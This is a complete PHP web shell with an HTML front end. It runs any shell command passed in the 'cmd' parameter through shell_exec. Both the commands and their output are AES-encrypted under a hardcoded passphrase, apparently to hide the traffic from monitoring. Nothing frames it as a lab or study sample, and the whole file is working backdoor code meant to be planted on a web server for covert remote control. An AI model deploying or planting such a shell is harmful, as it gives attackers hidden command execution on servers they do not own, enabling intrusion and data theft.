<?php
function cryptoJsAesDecrypt($passphrase, $jsonString)
{
    $jsondata = json_decode($jsonString, true);
    $salt = hex2bin($jsondata["s"]);
    $ct = base64_decode($jsondata["ct"]);
    $iv  = hex2bin($jsondata["iv"]);
    $concatedPassphrase = $passphrase.$salt;
    $md5 = array();
    $md5[0] = md5($concatedPassphrase, true);
    $result = $md5[0];
    for ($i = 1; $i < 3; $i++) {
        $md5[$i] = md5($md5[$i - 1].$concatedPassphrase, true);
        $result .= $md5[$i];
    }
    $key = substr($result, 0, 32);
    $data = openssl_decrypt($ct, 'aes-256-cbc', $key, true, $iv);
    return json_decode($data, true);
}
function cryptoJsAesEncrypt($passphrase, $value)
{
    $salt = openssl_random_pseudo_bytes(8);
    $salted = '';
    $dx = '';
    while (strlen($salted) < 48) {
        $dx = md5($dx.$passphrase.$salt, true);
        $salted .= $dx;
    }
    $key = substr($salted, 0, 32);
    $iv  = substr($salted, 32, 16);
    $encrypted_data = openssl_encrypt(json_encode($value), 'aes-256-cbc', $key, true, $iv);
    $data = array("ct" => base64_encode($encrypted_data), "iv" => bin2hex($iv), "s" => bin2hex($salt));
    return json_encode($data);
}
$passphrase = "definitely-NotL";
$encrypted = "";
if (isset($_GET['cmd'])) {
    $decrypted = cryptoJsAesDecrypt($passphrase, base64_decode($_GET['cmd']));
    $encrypted = cryptoJsAesEncrypt($passphrase, shell_exec($decrypted));
}
?>
<html>

<body>
    <form method="GET" onsubmit="return sendCMD(event);">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre id="output">
    </pre>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/aes.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/pbkdf2.min.js"></script>
<script>
    var passphrase = "definitely-NotL";
    var CryptoJSAesJson = {
        stringify: function(cipherParams) {
            var j = {
                ct: cipherParams.ciphertext.toString(CryptoJS.enc.Base64)
            };
            if (cipherParams.iv) j.iv = cipherParams.iv.toString();
            if (cipherParams.salt) j.s = cipherParams.salt.toString();
            return JSON.stringify(j);
        },
        parse: function(jsonStr) {
            var j = JSON.parse(jsonStr);
            var cipherParams = CryptoJS.lib.CipherParams.create({
                ciphertext: CryptoJS.enc.Base64.parse(j.ct)
            });
            if (j.iv) cipherParams.iv = CryptoJS.enc.Hex.parse(j.iv)
            if (j.s) cipherParams.salt = CryptoJS.enc.Hex.parse(j.s)
            return cipherParams;
        }
    }

    function sendCMD(event) {
        event.preventDefault();
        var encrypted = CryptoJS.AES.encrypt(JSON.stringify(event.target.elements.cmd.value), passphrase, {
            format: CryptoJSAesJson
        }).toString();
        location.href = "http://localhost:8080/?cmd=" + btoa(encrypted);
    }
    document.getElementById("output").innerHTML = JSON.parse(CryptoJS.AES.decrypt(
        '<?php echo $encrypted;?>',
        passphrase, {
            format: CryptoJSAesJson
        }).toString(CryptoJS.enc.Utf8));
</script>

</html>